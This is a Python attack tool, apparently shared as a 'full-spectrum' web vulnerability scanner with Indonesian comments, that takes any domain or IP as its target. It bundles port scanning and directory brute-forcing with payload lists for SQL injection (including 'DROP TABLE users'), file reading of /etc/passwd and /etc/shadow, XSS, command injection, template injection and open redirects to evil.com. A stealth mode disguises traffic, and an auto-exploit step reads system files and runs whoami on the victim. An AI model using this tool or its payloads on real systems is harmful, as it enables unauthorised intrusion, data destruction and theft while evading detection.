#!/usr/bin/env python3
"""
VOID ULTIMATE SCANNER v3.0 - Full-Spectrum Web Vulnerability Scanner
HANYA UNTUK PENGUJIAN DI LINGKUNGAN ANDA SENDIRI
"""

import os
import sys
import re
import time
import json
import socket
import random
import urllib.parse
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urljoin, quote_plus
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
except ImportError:
    os.system("pip install requests")
    import requests

# ========================================
# KONFIGURASI
# ========================================
VERSION = "3.0"
TIMEOUT = 10
MAX_THREADS = 30
STEALTH_MODE = True
VERBOSE = False

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36",
]

COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5432, 5900, 8080, 8443]

COMMON_DIRS_FILES = [
    "admin", "login", "uploads", "backup", "tmp", "logs", "phpmyadmin", "wp-admin",
    "wp-content", "api", "css", "js", "images", "files", "download", "data",
    "config", "includes", "modules", "plugins", "themes", "vendor", "lib", "inc",
    "assets", "static", "media", "cgi-bin", "shell", "cmd", "test", "phpinfo",
    "info", "dashboard", "panel", "cpanel", "index.php", "index.html", "robots.txt",
    "sitemap.xml", "crossdomain.xml", "phpinfo.php", ".htaccess", "web.config",
    "error_log", "README.md", "composer.json", "package.json", "wp-config.php",
    "config.php", "database.php", "db.php", "backup.sql", "dump.sql", "adminer.php"
]

SQLI_PAYLOADS = [
    "'", "\"", "' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL--",
    "' AND SLEEP(3)--", "' OR BENCHMARK(5000000,MD5('a'))--",
    "'; DROP TABLE users--", "' OR '1'='1'/*"
]

LFI_PAYLOADS = [
    "../../../etc/passwd", "../../../../etc/passwd", "../../../../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini", "/etc/passwd", "/etc/shadow", "/proc/self/environ"
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "\"><script>alert('XSS')</script>",
    "';alert('XSS');//",
    "<svg/onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>"
]

CMD_PAYLOADS = [
    "; id", "| id", "& id", "&& whoami", "|| whoami",
    "; uname -a", "| uname -a", "; cat /etc/issue"
]

SSTI_PAYLOADS = [
    "{{7*7}}", "${7*7}", "${{7*7}}", "{{7*'7'}}", "{{ config }}"
]

OPEN_REDIRECT_PAYLOADS = [
    "http://example.com", "//example.com", "/http://example.com",
    "//evil.com", "javascript:alert(1)"
]

# ========================================
# UTILITY FUNCTIONS
# ========================================
def print_banner():
    print("""
   ╔═══════════════════════════════════════════════════════╗
   ║     V O I D   U L T I M A T E   S C A N N E R  v3.0  ║
   ║   Full-Spectrum Web Security Assessment Tool          ║
   ╚═══════════════════════════════════════════════════════╝
    """)

def get_random_ua():
    return random.choice(USER_AGENTS)

def safe_request(url, method="GET", params=None, data=None, files=None, allow_redirects=True, timeout=TIMEOUT):
    try:
        headers = {"User-Agent": get_random_ua()}
        if STEALTH_MODE:
            headers.update({
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            })
        if method.upper() == "GET":
            r = requests.get(url, params=params, headers=headers, timeout=timeout, allow_redirects=allow_redirects)
        else:
            r = requests.post(url, data=data, files=files, headers=headers, timeout=timeout, allow_redirects=allow_redirects)
        if STEALTH_MODE:
            time.sleep(random.uniform(0.3, 1.2))
        return r
    except Exception as e:
        if VERBOSE:
            print(f"  [!] Request error: {e}")
        return None

def resolve_domain(domain):
    try:
        return socket.gethostbyname(domain)
    except:
        return None

def check_port(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        result = s.connect_ex((ip, port))
        s.close()
        return result == 0
    except:
        return False

def to_serializable(obj):
    if isinstance(obj, set):
        return list(obj)
    if isinstance(obj, dict):
        return {k: to_serializable(v) for k, v in obj.items()}
    if isinstance(obj, list):
        return [to_serializable(i) for i in obj]
    return obj

# ========================================
# MODUL RECON
# ========================================
def recon(target):
    print(f"\n\033[1;33m[+] RECONNAISSANCE: {target}\033[0m")
    result = {"target": target, "ip": None, "ports": [], "server": "Unknown", "technologies": []}
    ip = resolve_domain(target)
    result["ip"] = ip
    print(f"  IP Address: {ip if ip else 'Gagal resolve'}")
    if ip:
        print("  Scanning common ports...")
        open_ports = []
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(check_port, ip, port): port for port in COMMON_PORTS}
            for future in as_completed(futures):
                port = futures[future]
                if future.result():
                    open_ports.append(port)
        result["ports"] = open_ports
        print(f"  Open ports: {', '.join(map(str, open_ports)) if open_ports else 'None'}")
    for proto in ["https", "http"]:
        try:
            r = safe_request(f"{proto}://{target}", timeout=5)
            if r:
                result["server"] = r.headers.get("Server", "Unknown")
                print(f"  Server: {result['server']}")
                print(f"  X-Powered-By: {r.headers.get('X-Powered-By', 'Unknown')}")
                techs = []
                if "wp-content" in r.text.lower(): techs.append("WordPress")
                if "joomla" in r.text.lower(): techs.append("Joomla")
                if "drupal" in r.text.lower(): techs.append("Drupal")
                if "laravel" in r.text.lower(): techs.append("Laravel")
                if techs:
                    result["technologies"] = techs
                    print(f"  Technologies: {', '.join(techs)}")
                break
        except:
            continue
    return result

# ========================================
# MODUL DIRECTORY SCAN
# ========================================
def dir_scan(target, proto):
    print(f"\n\033[1;33m[+] DIRECTORY & FILE SCANNING\033[0m")
    base_url = f"{proto}://{target}"
    found = []
    def check(path):
        url = urljoin(base_url, path)
        r = safe_request(url, timeout=3)
        if r and r.status_code in [200, 403, 401]:
            return {"url": url, "status": r.status_code}
        return None
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(check, p): p for p in COMMON_DIRS_FILES}
        for future in as_completed(futures):
            res = future.result()
            if res:
                print(f"  [+] Found: {res['url']} ({res['status']})")
                found.append(res)
    return found

# ========================================
# MODUL PARAMETER DISCOVERY
# ========================================
def discover_params(target, proto):
    print(f"\n\033[1;33m[+] DISCOVERING PARAMETERS\033[0m")
    base_url = f"{proto}://{target}"
    params = set()
    r = safe_request(base_url)
    if r:
        matches = re.findall(r'\?([a-zA-Z0-9_]+)=', r.text)
        params.update(matches)
        form_matches = re.findall(r'<input.*?name=["\']([^"\']+)["\']', r.text)
        params.update(form_matches)
    if not params:
        params = {"id", "page", "file", "q", "s", "view", "action", "cat", "product", "dir", "exec", "query", "search", "system", "path", "cmd"}
    get_params = [p for p in params if not p.startswith("_")]
    print(f"  Found parameters: GET({len(get_params)}) POST(0)")
    return {"GET": get_params, "POST": []}

# ========================================
# MODUL VULNERABILITY TESTS
# ========================================
def test_sqli(target, proto, params):
    print(f"\n\033[1;33m[+] TESTING SQL INJECTION\033[0m")
    base_url = f"{proto}://{target}"
    findings = []
    for param in params["GET"]:
        for payload in SQLI_PAYLOADS:
            url = f"{base_url}?{param}={quote_plus(payload)}"
            r = safe_request(url)
            if r:
                if "SQL" in r.text or "mysql" in r.text or "syntax" in r.text:
                    findings.append({"param": param, "payload": payload, "type": "Error-based"})
                    print(f"  [✓] SQLi: {param} with {payload[:20]}...")
                    break
                if "SLEEP" in payload and r.elapsed.total_seconds() > 2.5:
                    findings.append({"param": param, "payload": payload, "type": "Time-based"})
                    print(f"  [✓] SQLi (time): {param} with {payload[:20]}...")
                    break
    if not findings:
        print("  [✗] No SQLi found")
    return findings

def test_lfi(target, proto, params):
    print(f"\n\033[1;33m[+] TESTING LFI\033[0m")
    base_url = f"{proto}://{target}"
    findings = []
    for param in params["GET"]:
        for payload in LFI_PAYLOADS:
            url = f"{base_url}?{param}={quote_plus(payload)}"
            r = safe_request(url)
            if r and ("root:" in r.text or "[extensions]" in r.text or "Administrator" in r.text):
                findings.append({"param": param, "payload": payload})
                print(f"  [✓] LFI: {param} with {payload}")
                break
    if not findings:
        print("  [✗] No LFI found")
    return findings

def test_xss(target, proto, params):
    print(f"\n\033[1;33m[+] TESTING XSS\033[0m")
    base_url = f"{proto}://{target}"
    findings = []
    for param in params["GET"]:
        for payload in XSS_PAYLOADS:
            url = f"{base_url}?{param}={quote_plus(payload)}"
            r = safe_request(url)
            if r and payload.replace("<", "&lt;") not in r.text and ("<script>" in r.text or "alert" in r.text):
                findings.append({"param": param, "payload": payload})
                print(f"  [✓] XSS: {param} with {payload[:20]}...")
                break
    if not findings:
        print("  [✗] No XSS found")
    return findings

def test_cmd(target, proto, params):
    print(f"\n\033[1;33m[+] TESTING COMMAND INJECTION\033[0m")
    base_url = f"{proto}://{target}"
    findings = []
    for param in params["GET"]:
        for payload in CMD_PAYLOADS:
            url = f"{base_url}?{param}={quote_plus(payload)}"
            r = safe_request(url)
            if r and ("uid=" in r.text or "username" in r.text.lower() or "uname" in r.text):
                findings.append({"param": param, "payload": payload})
                print(f"  [✓] Command Injection: {param} with {payload}")
                break
    if not findings:
        print("  [✗] No Command Injection found")
    return findings

def test_ssti(target, proto, params):
    print(f"\n\033[1;33m[+] TESTING SSTI\033[0m")
    base_url = f"{proto}://{target}"
    findings = []
    for param in params["GET"]:
        for payload in SSTI_PAYLOADS:
            url = f"{base_url}?{param}={quote_plus(payload)}"
            r = safe_request(url)
            if r and "49" in r.text:
                findings.append({"param": param, "payload": payload})
                print(f"  [✓] SSTI: {param} with {payload}")
                break
    if not findings:
        print("  [✗] No SSTI found")
    return findings

def test_open_redirect(target, proto, params):
    print(f"\n\033[1;33m[+] TESTING OPEN REDIRECT\033[0m")
    base_url = f"{proto}://{target}"
    findings = []
    for param in params["GET"]:
        for payload in OPEN_REDIRECT_PAYLOADS:
            url = f"{base_url}?{param}={quote_plus(payload)}"
            r = safe_request(url, allow_redirects=False)
            if r and r.status_code in [301, 302, 307, 308]:
                loc = r.headers.get("Location", "")
                if "example.com" in loc or "evil.com" in loc:
                    findings.append({"param": param, "payload": payload})
                    print(f"  [✓] Open Redirect: {param} with {payload}")
                    break
    if not findings:
        print("  [✗] No Open Redirect found")
    return findings

# ========================================
# MODUL AUTO-EXPLOIT
# ========================================
def auto_exploit(target, proto, results):
    print(f"\n\033[1;33m[+] AUTO-EXPLOITATION (safe)\033[0m")
    base_url = f"{proto}://{target}"
    if results.get("lfi"):
        for f in results["lfi"]:
            param = f["param"]
            payload = "../../../../../etc/passwd"
            url = f"{base_url}?{param}={quote_plus(payload)}"
            r = safe_request(url)
            if r and "root:" in r.text:
                print(f"  [✓] LFI exploit: read /etc/passwd via {param}")
                print(f"    Sample: {r.text[:200]}...")
                break
    if results.get("cmd"):
        for f in results["cmd"]:
            param = f["param"]
            payload = "; whoami"
            url = f"{base_url}?{param}={quote_plus(payload)}"
            r = safe_request(url)
            if r and ("www-data" in r.text or "root" in r.text):
                print(f"  [✓] CMD exploit: whoami -> {r.text[:100]}")
                break
    print("  [i] Auto-exploit done.")

# ========================================
# REPORT GENERATOR
# ========================================
def generate_report(target, results):
    print(f"\n\033[1;33m[+] GENERATING REPORT\033[0m")
    timestamp = datetime.now().isoformat()
    report = {
        "target": target,
        "timestamp": timestamp,
        "recon": results.get("recon", {}),
        "directories": results.get("dirs", []),
        "parameters": results.get("params", {}),
        "vulnerabilities": {
            "sqli": results.get("sqli", []),
            "lfi": results.get("lfi", []),
            "xss": results.get("xss", []),
            "cmd": results.get("cmd", []),
            "ssti": results.get("ssti", []),
            "open_redirect": results.get("open_redirect", [])
        },
        "summary": {
            "total": sum(len(v) for v in results.values() if isinstance(v, list)),
            "high_risk": len(results.get("cmd", [])) + len(results.get("sqli", [])),
            "medium_risk": len(results.get("xss", [])) + len(results.get("lfi", [])),
            "low_risk": len(results.get("ssti", [])) + len(results.get("open_redirect", []))
        }
    }
    report_serializable = to_serializable(report)
    filename = f"scan_{target}_{int(time.time())}.json"
    with open(filename, "w") as f:
        json.dump(report_serializable, f, indent=2)
    print(f"  [✓] Report saved to {filename}")

    print("\n" + "="*60)
    print(f"\033[1;36m[LAPORAN SCAN] Target: {target}\033[0m")
    print("="*60)
    print(f"  Total vulnerabilities: {report['summary']['total']}")
    print(f"  High risk: {report['summary']['high_risk']}")
    print(f"  Medium risk: {report['summary']['medium_risk']}")
    print(f"  Low risk: {report['summary']['low_risk']}")
    print("="*60)
    for vuln_type, data in report["vulnerabilities"].items():
        if data:
            print(f"  \033[1;32m[✓] {vuln_type.upper()}: {len(data)} found\033[0m")
        else:
            print(f"  \033[1;31m[✗] {vuln_type.upper()}: None\033[0m")
    print("="*60)

# ========================================
# MAIN
# ========================================
def main():
    global STEALTH_MODE, VERBOSE, MAX_THREADS
    os.system('clear' if os.name != 'nt' else 'cls')
    print_banner()
    print("\033[1;33m[!] HANYA UNTUK PENGUJIAN DI LINGKUNGAN ANDA SENDIRI\033[0m")
    print(f"Version: {VERSION}\n")

    if len(sys.argv) < 2:
        target = input("\n\033[1;36m[?] Masukkan target (domain/IP): \033[0m").strip()
    else:
        target = sys.argv[1]
    if not target:
        print("[!] Target kosong.")
        return

    proto = "https" if input("[?] Gunakan HTTPS? (y/n): ").lower() == 'y' else "http"
    try:
        MAX_THREADS = int(input("[?] Jumlah thread (default 30): ") or 30)
    except:
        MAX_THREADS = 30
    STEALTH_MODE = input("[?] Mode Stealth? (y/n): ").lower() == 'y'
    VERBOSE = input("[?] Tampilkan error? (y/n): ").lower() == 'y'

    results = {}
    results["recon"] = recon(target)
    results["dirs"] = dir_scan(target, proto)
    results["params"] = discover_params(target, proto)
    params = results["params"]
    results["sqli"] = test_sqli(target, proto, params)
    results["lfi"] = test_lfi(target, proto, params)
    results["xss"] = test_xss(target, proto, params)
    results["cmd"] = test_cmd(target, proto, params)
    results["ssti"] = test_ssti(target, proto, params)
    results["open_redirect"] = test_open_redirect(target, proto, params)
    auto_exploit(target, proto, results)
    generate_report(target, results)

    print("\n[+] Scan selesai.")
    input("Tekan Enter untuk keluar...")

if __name__ == "__main__":
    main()
